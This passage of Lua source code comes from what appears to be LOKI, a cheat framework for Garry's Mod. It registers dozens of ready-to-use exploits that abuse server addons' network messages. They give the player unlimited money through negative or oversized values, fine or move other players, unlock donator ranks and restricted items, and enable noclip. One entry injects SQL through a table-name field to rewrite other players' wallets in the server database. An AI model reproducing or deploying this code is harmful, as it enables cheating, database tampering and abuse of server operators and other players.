        { typ = "func", Name = "Give me shekels", },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {enabled = false},
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "casinokit_chipexchange" ) && LOKI.GetLP().getDarkRPVar end,
    hooks = {
        Think = function(tbl, sploit)
            local moneylog = LOKI.GetLP():getDarkRPVar("money")
            LOKI.NetStart( sploit, "casinokit_chipexchange")
            net.WriteEntity(LOKI.GetLP())
            net.WriteString("darkrp")
            net.WriteBool(true)
            net.WriteUInt(LOKI.GetLP():getDarkRPVar("money"),32)
            net.SendToServer()
            for i=1, 10 do
                LOKI.NetStart( sploit, "casinokit_chipexchange")
                net.WriteEntity(LOKI.GetLP())
                net.WriteString("darkrp")
                net.WriteBool(false)
                net.WriteUInt(moneylog*0.10,32)
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "func", Name = "Give me shekels", },
    },
} ) 
LOKI.AddExploit( "Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "hitcomplete" ) && LOKI.GetLP().getDarkRPVar end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "hitcomplete")
            net.WriteDouble( LOKI.GetStored( "shekels4" ) )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Amount", min = 1, max = 100000, default = 1000, addr = "shekels4" },
        { typ = "func", Name = "Give me shekels", },
    },
} ) 
LOKI.AddExploit( "Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "WithdrewBMoney" ) && LOKI.GetLP().getDarkRPVar end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "WithdrewBMoney" )
            net.WriteInt( LOKI.GetStored( "shekels5" ), 32 )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Amount", min = 1, max = 50000, default = 1000, addr = "shekels5" },
        { typ = "func", Name = "Give me shekels", },
    },
} ) 
LOKI.AddExploit( "Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "ClickerAddToPoints" ) && LOKI.GetLP().getDarkRPVar end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "ClickerAddToPoints")
            net.WriteInt(LOKI.GetStored( "shekels6" ), 32)
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Amount", min = 1, max = (math.pow(2, 32)-1)/2, default = 1000, addr = "shekels6" },
        { typ = "func", Name = "Give me shekels", },
    },
} )     
LOKI.AddExploit( "Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {enabled = false},
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "ckit_roul_bet" ) && LOKI.GetLP().getDarkRPVar end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "ckit_roul_bet")
            net.WriteEntity(LOKI.GetLP())
            net.WriteString("")
            net.WriteString("")
            net.WriteUInt(-LOKI.SafeToNumber(LOKI.GetStored( "shekels7" )), 16)
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Amount", min = 1, max = math.pow(2, 16)-1, default = 1000, addr = "shekels7" },
        { typ = "func", Name = "Give me shekels", },
    },
} ) 
LOKI.AddExploit( "Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {enabled = false},
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "duelrequestguiYes" ) && LOKI.GetLP().getDarkRPVar end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "duelrequestguiYes")
            net.WriteInt(0xFFFFFFFF,32)
            net.WriteEntity(table.Random( player.GetAll() ) )
            net.WriteString("Crossbow")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Give me shekels", },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    prevalidated = true,
    scan = function() return LOKI.ValidNetString( "pplay_sendtable", "pplay_deleterow" ) && cl_PPlay && LOKI.GetLP().getDarkRPVar end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.GetStored( "shekels2_plyz", {} ) ) do
                if IsValid(v) then
                    local ass = {}
                    ass.tblname = "darkrp_player; UPDATE darkrp_player SET wallet = "..LOKI.SafeToNumber(LOKI.GetStored( "shekels9" )).." WHERE uid = " .. v:SteamID64() .. "; UPDATE darkrp_player SET wallet "..LOKI.SafeToNumber(LOKI.GetStored( "shekels9" )).." WHERE uid = "  .. v:UniqueID()
                    ass.ply = v
                    LOKI.NetStart( sploit, "pplay_sendtable")
                    net.WriteTable(ass)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "shekels2_plyz" },
        { typ = "float", Name = "Amount", min = 1, max = 100000, default = 1000, addr = "shekels9" },
        { typ = "func", Name = "Give shekels", },
    },
} ) 
LOKI.AddExploit( "Money Exploit", {
    desc = "Effectiveness varies server to server",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "RevivePlayer" ) && LOKI.GetLP().getDarkRPVar end,
    hooks = {
        Think = function(tbl, sploit)
            local r_tbl = LOKI.RecursiveGetVar(sploit, {"vars", "Think"}, "table", true)
            if(r_tbl.cooldown == 0) then
                r_tbl.cooldown = (LOKI.REAL_CURTIME + LOKI.SafeToNumber(LOKI.GetStored( "shekels10" )))
            end
            LOKI.NetStart( sploit, "RevivePlayer")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Cooldown", min = 1, max = 300, default = 60, addr = "shekels10" },
        { typ = "bool" },
    },
} ) 
LOKI.AddExploit( "Money Exploit", {
    desc = "Give people a crapton of money",
    severity = 50,
    bools = {enabled = false},
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "75_plus_win" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.GetStored( "shekels11_plyz", {} ) ) do
                if IsValid(v) then
                    LOKI.NetStart( sploit, "75_plus_win" )
                    net.WriteString( LOKI.GetStored( "shekels11" ) )
                    net.WriteEntity(v)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "shekels11_plyz" },
        { typ = "float", Name = "Amount", min = 1, max = 100000, default = 1000, addr = "shekels11" },
        { typ = "func", Name = "Give shekels", },
    },
} ) 
LOKI.AddExploit( "Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {enabled = false},
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "ATMDepositMoney" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "ATMDepositMoney" )
            net.WriteFloat( -LOKI.GetStored( "shekels12" ) )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Amount", min = 1, max = 100000, default = 1000, addr = "shekels12" },
        { typ = "func", Name = "Give me shekels", },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {enabled = false},
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "SellMinerals", "Upgrade" ) end,
    hooks = {
        Think = function(tbl, sploit)
            if(SkillDB && istable(SkillDB)) then
                for k1,v1 in pairs(SkillDB) do
                    if not ( v1.iSkill == true ) then
                        LOKI.NetStart( sploit, "SetUpgrade")
                        net.WriteTable( { LuaName = v1.LuaName, Amount = LOKI.GetStored( "shekels13" ) } )
                        net.SendToServer()
    
                        LOKI.NetStart( sploit, "SellMinerals" )
                        net.WriteTable( { Target = LOKI.GetLP() } )
                        net.SendToServer()
                    end
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "shekels13_plyz" },
        { typ = "float", Name = "Amount", min = 1, max = 100000, default = 1000, addr = "shekels13" },
        { typ = "func", Name = "Give shekels", },
    },
} ) 
LOKI.AddExploit( "Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {enabled = false},
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "TakeBetMoney" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "TakeBetMoney" )
            net.WriteTable({LOKI.SafeToNumber(LOKI.GetStored( "shekels14" )), LOKI.SafeToNumber(LOKI.GetStored( "shekels14" ))})
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Amount", min = 1, max = math.huge, default = 1000, addr = "shekels14" },
        { typ = "func", Name = "Give me shekels", },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {enabled = false},
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "kart_sell" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "kart_sell")
            net.WriteString("sw_gokart")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Give me shekels", },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Fine other players for free money",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "tickbooksendfine" ) end,
    hooks = {
        Think = function(tbl, sploit)
            local ply_tbl = LOKI.GetStored( "shekels17_plyz", {} )
            local max_dist = LOKI.RecursiveGetVar(TicketBook, {"Config", "TB", "MaxDistance"}, "number")
            if(max_dist) then
                ply_tbl = ents.FindInSphere(LOKI.GetLP():GetPos(), max_dist)
            end
            for k, v in ipairs( ply_tbl ) do
                local t = LOKI.GetStored( "shekels17_plyz", {} )
                if table.HasValue( t, v ) then
                    LOKI.NetStart( sploit, "tickbooksendfine")
                    net.WriteString(v:SteamID())
                    net.WriteTable({LOKI.GetStored("shekels17r", "GET ODIUM.PRO")})
                    net.WriteDouble(LOKI.SafeToNumber(LOKI.GetStored("shekels17", 1500)), 32)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "shekels17_plyz" },
        { typ = "float", Name = "Amount", min = 1, max = (LOKI.RecursiveGetVar(TicketBook, {"Config", "Fine", "Max"}, "number") || 5000), default = 1000, addr = "shekels17" },
        { typ = "string", Name = "Fine Reason", default = "GET ODIUM.PRO", addr = "shekels17r" },
        { typ = "bool", Name = "Give me shekels", },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {enabled = false},
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "hhh_request" ) end,
    hooks = {
        Think = function(tbl, sploit)
            local hitRequest = {hitman = LOKI.GetLP(), requester = LOKI.GetLP(), target = table.Random(player.GetAll()), reward = LOKI.SafeToNumber(LOKI.GetStored("shekels18", 1500))}
        
            LOKI.NetStart( sploit, 'hhh_request' )
                net.WriteTable( hitRequest )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Amount", min = 1, max = math.huge, default = 1000, addr = "shekels18" },
        { typ = "func", Name = "Give me shekels", },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Ez money",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "DaHit" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "DaHit" )
            net.WriteFloat( -LOKI.SafeToNumber(LOKI.GetStored("shekels19", 1500)) )
            net.WriteEntity( LOKI.GetLP() )
            net.WriteEntity( LOKI.GetLP() )
            net.WriteEntity( LOKI.GetLP() )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Amount", min = 1, max = math.huge, default = 1000, addr = "shekels19" },
        { typ = "func", Name = "Give me shekels", },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Just a Taxi Driver trying to make an honest living",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "NET_EcSetTax" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "NET_EcSetTax" )
            net.WriteInt(LOKI.GetStored("shekels21", 1000), 16)
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Amount", min = 1, max = (math.pow(2, 16)-1)/2, default = 1000, addr = "shekels21" },
        { typ = "func", Name = "Give me shekels", },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Just an Irish Farmer trying to make an honest living",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    prevalidated = true,
    scan = function() return LOKI.ValidNetString( "FARMINGMOD_ADDITEM", "FARMINGMOD_SELLITEM" ) end,
    hooks = {
        Think = function(tbl, sploit)
            local tbl = {}
            local r_tbl = LOKI.RecursiveGetVar(_G, {"FARMINGMOD", "crops"}, "table")
            if(r_tbl) then
                for _, crop in pairs(r_tbl) do
                    if(crop.sell && !tbl.sell || crop.sell > tbl.sell) then
                        tbl = crop
                    end
                end
                local quantity = (LOKI.GetStored("shekels22", 1000) / tbl.sell) + 1
                local recurse = math.Round(quantity / ((math.pow(2, 16)-1)/2))
                for i=0,recurse do
                    if(recurse > 1) then
                        quantity = quantity - ((math.pow(2, 16)-1)/2)
                    end
                    local quant = math.Clamp(quantity, 1, ((math.pow(2, 16)-1)/2))
                    LOKI.NetStart( sploit, "FARMINGMOD_ADDITEM", true )
                    net.WriteTable(tbl)
                    net.WriteInt(quant, 16)
                    net.SendToServer()
                    LOKI.NetStart( sploit, "FARMINGMOD_SELLITEM", true )
                    net.WriteTable(tbl)
                    net.WriteInt(quant, 16)
                    net.SendToServer()
                end
            else
                sploit.status = 3
            end
        end,
    },
    functions = {
        { typ = "float", Name = "Amount", min = 1, max = math.huge, default = 1000, addr = "shekels22" },
        { typ = "func", Name = "Give me shekels", },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Inverse the polarity of the servers moral compass",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    count = {
        ["Active"] = 6,
        ["Total"] = 6,
    },
    scan = function() return LOKI.DynamicNetString("credit_") && net.Receivers["credit_gui_loan"] end,
    hooks = {
        net = {
            WriteDouble = function(sploit, varargs)
                local CMOD_Messages = {
                    ["credit_"] = true,
                }
                for k, v in pairs(CMOD_Messages) do
                    if(sploit.bools.enabled && LOKI.NetOutgoingMsg && LOKI.NetOutgoingMsg:find(k)) then
                        varargs[1] = -varargs[1]
                        break
                    end
                end
            end,
        },
    },
    functions = {
        { typ = "bool" },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Show the server your empty wallet and see if it feels guilty",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    count = {
        ["Active"] = 1,
        ["Total"] = 1,
    },
    scan = function() return LOKI.ValidNetString("lp2PrinterCart") end,
    hooks = {
        util = {
            TableToJSON = function(sploit, varargs)
                if(varargs[1].fullPrice && sploit.bools.freeprint) then
                    varargs[1].fullPrice = 0
                    //varargs[1].product1 = "worldspawn"
                end
            end,
        },
    },
    functions = {
        { typ = "bool", ToggleText = {"Free Printers"}, border = true, bool = "freeprint" },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Pay your negative debts",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "FOC_ClaimPay" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "FOC_ClaimPay" )
            net.WriteInt(LOKI.GetStored("shekels23", 1000), 32)
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Amount", min = 1, max = (math.pow(2, 32)-1)/2, default = 1000, addr = "shekels23" },
        { typ = "func", Name = "Give me shekels", },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Pickpocket repeater",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "fixg" ) end,
    hooks = {
        Think = function(tbl, sploit)
            if(IsValid(LOKI.GetLP():GetNW2Entity("rgg"))) then
                LOKI.NetStart( sploit, "fixg" )
                net.WriteEntity(LOKI.GetLP():GetNW2Entity("rgg"))
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "bool" },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "It would appear that crime does pay",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "dialogReward" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "dialogReward" )
            net.WriteInt( LOKI.GetStored("scpmx_money", 1000), 32 )
            net.WriteInt( LOKI.GetStored("scpmx_points", 1000), 32 )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Money", min = 1, max = (math.pow(2, 32)-1)/2, default = 1000, addr = "scpmx_money" },
        { typ = "float", Name = "Points", min = 1, max = (math.pow(2, 32)-1)/2, default = 1000, addr = "scpmx_points" },
        { typ = "func", Name = "Do it", },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Buy currency with your mothers credit card",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "PurchaseGun" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "PurchaseGun" )
            net.WriteInt( LOKI.GetStored("scpmx2_money", 1000), 16 )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Money", min = 1, max = (math.pow(2, 16)-1)/2, default = 1000, addr = "scpmx2_money" },
        { typ = "func", Name = "Do it", },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Rob the server bank",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "popupgivereward" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "popupgivereward" )
            net.WriteInt( LOKI.GetStored("scpmx3_money", 1), 32 )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Days", min = 1, max = 7, default = 1, addr = "scpmx3_money" },
        { typ = "func", Name = "Do it", },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Win the lottery",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "PurchaseAmmo" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "PurchaseAmmo" )
            net.WriteInt( LOKI.GetStored("scpmx4_money", 1000), 16 )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Money", min = 1, max = math.floor((math.pow(2, 16)-1)/2), default = 1000, addr = "scpmx4_money" },
        { typ = "func", Name = "Do it", },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Man these negative taxes sure are great!",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "givemoneyonetime" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "givemoneyonetime" )
            net.WriteString(-tonumber(LOKI.GetStored("mx24", 1000)))
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Money", min = 1, max = math.huge, default = 1000, addr = "mx24" },
        { typ = "func", Name = "Do it", },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "It's tax collection day and you've earned negative money this year!",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "take_my_cash" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "take_my_cash" )
            net.WriteString(-tonumber(LOKI.GetStored("mx24", 1000)))
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Money", min = 1, max = math.huge, default = 1000, addr = "mx24" },
        { typ = "func", Name = "Do it", },
    },
} )
LOKI.AddExploit( "Points Exploit", {
    desc = "PacMan would disapprove (causes server-side errors, only sometimes works)",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "IntercomPlay" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for i=0, tonumber(LOKI.GetStored("scpmx5_points", 1000)) do
                LOKI.NetStart( sploit, "IntercomPlay" )
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "float", Name = "Points", min = 1, max = math.huge, default = 1000, addr = "scpmx5_points" },
        { typ = "func", Name = "Do it", },
    },
} )
LOKI.AddExploit( "Donator Exploit", {
    desc = "Become a Pay2Win player for free",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "createvalue" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "createvalue" )
            net.WriteString( "donatelevel" )
            net.WriteInt( LOKI.GetStored("donate1", 6), 16 )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Level", min = 1, max = (math.pow(2, 16)-1)/2, default = 6, addr = "donate1" },
        { typ = "func", Name = "Do it", },
    },
} )
LOKI.AddExploit( "Inventory Exploit", {
    desc = "Buy any item (even donator/admin restricted)",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    scan = function() return LOKI.RecursiveGetVar(_G, {"CRAFTINGMOD"}, "table") != false || LOKI.RecursiveGetVar(_G, {"FARMINGMOD"}, "table") != false || LOKI.RecursiveGetVar(_G, {"FISHINGMOD"}, "table") != false end,
    count = {
        ["Active"] = 0,
        ["Total"] = 3,
    },
    initial = function(sploit)
        if(sploit.count.Active == 0) then
            local CMOD_Messages = {
                ["CRAFTINGMOD"] = true,
                ["FARMINGMOD"] = true,
                ["FISHINGMOD"] = true,
            }
            for k, v in pairs(CMOD_Messages) do
                if(LOKI.DynamicNetString(k)) then
                    sploit.count.Active = sploit.count.Active + 1
                end
            end
        end
    end,
    hooks = {
        Think = function(tbl, sploit)
            if(tbl[1] == 1) then
                local CMOD = LOKI.RecursiveGetVar(_G, {"CRAFTINGMOD"}, "table")
                if(CMOD) then
                    LOKI.Menu:SetVisible(false)
                    local buy_tbl = {}
                    for k, v in pairs(CMOD) do
                        if(LOKI.ValidTable(v) && v.LIST) then
                            for k2, v2 in pairs(v.LIST) do
                                if(v2.BUY) then
                                    if(!v2.MODEL) then
                                        v2.MODEL = "models/error.mdl"
                                    end
                                    table.insert(buy_tbl, v2)
                                end
                            end
                        end
                    end
                    CMOD.PANELS.Shop_ = buy_tbl
                    CMOD.PANELS.Shop_Entity = ents.FindByClass("CRAFTINGMOD_SHOP")[1] || Entity(0)
                    CMOD.PANELS:CreateShop()
                end
            elseif(tbl[1] == 2) then
                local Shop = LOKI.RecursiveGetVar(_G, {"FARMINGMOD", "Shop"}, "function")
                if(Shop) then
                    Shop(FARMINGMOD)
                    LOKI.Menu:SetVisible(false)
                end
            elseif(tbl[1] == 3) then
                local Shop = LOKI.RecursiveGetVar(_G, {"FISHINGMOD", "Menu", "CreateShop"}, "function")
                if(Shop) then
                    Shop(FISHINGMOD.Menu)
                    LOKI.Menu:SetVisible(false)
                end
            end
        end,
        net = {
            WriteTable = function(sploit, varargs)
                if(istable(varargs[1])) then
                    for k, v in pairs(varargs[1]) do
                        if(isfunction(v)) then
                            varargs[1][k] = nil
                        end
                    end
                end
            end,
        },
    },
    functions = {
        { typ = "func", Name = "Mining Shop", args = {1}, required = LOKI.RecursiveGetVar(_G, {"CRAFTINGMOD"}, "table") != false},
        { typ = "func", Name = "Farming Shop", args = {2}, required = LOKI.RecursiveGetVar(_G, {"FARMINGMOD"}, "table") != false},
        { typ = "func", Name = "Fishing Shop", args = {3}, required = LOKI.RecursiveGetVar(_G, {"FISHINGMOD"}, "table") != false},
    },
} )
LOKI.AddExploit( "Inventory Exploit", {
    desc = "Inverse the polarity of the servers moral compass",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    count = {
        ["Active"] = 0,
        ["Total"] = 9,
    },
    scan = function() return LOKI.DynamicNetString("CRAFTINGMOD") || LOKI.DynamicNetString("FARMINGMOD") || LOKI.DynamicNetString("FISHINGMOD") end,
    initial = function(sploit)
        if(sploit.count.Active == 0) then
            local CMOD_Messages = {
                ["CRAFTINGMOD"] = true,
                ["FARMINGMOD"] = true,
                ["FISHINGMOD"] = true,
            }
            for k, v in pairs(CMOD_Messages) do
                if(LOKI.DynamicNetString(k)) then
                    sploit.count.Active = sploit.count.Active + 3
                end
            end
        end
    end,
    hooks = {
        net = {
            WriteInt = function(sploit, varargs)
                local CMOD_Messages = {
                    ["CRAFTINGMOD"] = true,
                    ["FARMINGMOD"] = true,
                    ["FISHINGMOD"] = true,
                }
                for k, v in pairs(CMOD_Messages) do
                    if(sploit.bools.enabled && LOKI.NetOutgoingMsg && LOKI.NetOutgoingMsg:find(k)) then
                        varargs[1] = -varargs[1]
                        break
                    end
                end
            end,
        },
    },
    functions = {
        { typ = "bool" },
    },
} )
LOKI.AddExploit( "Inventory Exploit", {
    desc = "Convince the NPCs that you're a worthy charity",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    count = {
        ["Active"] = 2,
        ["Total"] = 2,
    },
    scan = function() return LOKI.DynamicNetString("BuyFromShopNPC") end,
    hooks = {
        net = {
            WriteTable = function(sploit, varargs)
                if(sploit.bools.enabled && istable(varargs[1]) && varargs[1].price && LOKI.NetOutgoingMsg && LOKI.NetOutgoingMsg:find("BuyFromShopNPC")) then
                    varargs[1].price = 0
                end
            end,
        },
    },
    functions = {
        { typ = "bool" },
    },
} )
LOKI.AddExploit( "Vehicle Exploit", {
    desc = "Give yourself a preset car",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "race_accept" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "race_accept")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Give me wheels", },
    },
} )
LOKI.AddExploit( "Vehicle Exploit", {
    desc = "Force any player into a vehicle",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "simfphys_request_seatswitch" ) end,
    hooks = {
        Think = function(tbl, sploit)
            local exploit = function(pl,veh,s)
                LOKI.NetStart( sploit, "simfphys_request_seatswitch", true )
                net.WriteEntity(veh)
                net.WriteEntity(pl)
                net.WriteInt(s, 32)
                net.SendToServer()
            end
            
            local ply = LOKI.GetStored("vx_ply", {})[1]
            local vehicle = LOKI.GetStored("vx_veh", {})[1]
            local seat = nil
            local pSeats = {}
            
            if(IsValid(ply) && IsValid(vehicle)) then
                if(isfunction(vehicle.GetRPM) && !IsValid( vehicle:GetDriver() )) then
                    return exploit(ply, vehicle, 0)
                end
                for k, v in ipairs(ents.GetAll()) do
                    if(v:GetParent() == vehicle) then
                        table.insert(pSeats, v)
                    end
                end
                for k, v in ipairs(pSeats) do
                    for k2, v2 in ipairs(player.GetAll()) do
                        if(v2:GetVehicle() == v) then
                            continue
                        end
                    end
                    return exploit(ply, vehicle, k)
                end
            end
        end,
    },
    functions = {
        { typ = "player", addr = "vx_ply", Name = "Player" },
        { typ = "entity", addr = "vx_veh", Name = "Vehicle", tbl = function() return LOKI.ents.FindByGlobal("GetDriverSeat") end },
        { typ = "func", Name = "Do it", },
    },
} )
LOKI.AddExploit( "NoClip Exploit", {
    desc = "Enter the spirit realm",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 0,
    vars = {},
    scan = function() return LOKI.ValidNetString( "flyover_git" ) end,
    OnEnable = function(var, sploit)
        if(var != "noclip") then return end
        local pos = LOKI.GetLP():GetPos()
        LOKI.NetStart( sploit, "flyover_git")
        net.WriteString(tostring(pos.x).." "..tostring(pos.y).." "..tostring(pos.z))
        net.SendToServer()
    end,
    OnDisable = function(var, sploit)
        if(var != "noclip") then return end
        local pos = LOKI.GetLP():GetPos()
        LOKI.NetStart( sploit, "fly_over_end")
        net.WriteString(tostring(pos.x).." "..tostring(pos.y).." "..tostring(pos.z))
        net.SendToServer()
    end,
    hooks = {
        Think = function(tbl, sploit)
            local pos = LOKI.Freecam.EyePos() - (LOKI.GetLP():EyePos() - LOKI.GetLP():GetPos())
            LOKI.NetStart( sploit, "fly_over_end")
            net.WriteString(tostring(pos.x).." "..tostring(pos.y).." "..tostring(pos.z))
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", ToggleText = {"NoClip"}, border = true, bool = "noclip" },
        { typ = "func", Name = "Teleport" },
    },
} )
LOKI.AddExploit( "NoClip Exploit", {
    desc = "Enter the spirit realm",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 0,
    vars = {},
    scan = function() return LOKI.ValidNetString( "079ServerAction" ) end,
    hooks = {
        CreateMove = function(tbl, sploit)
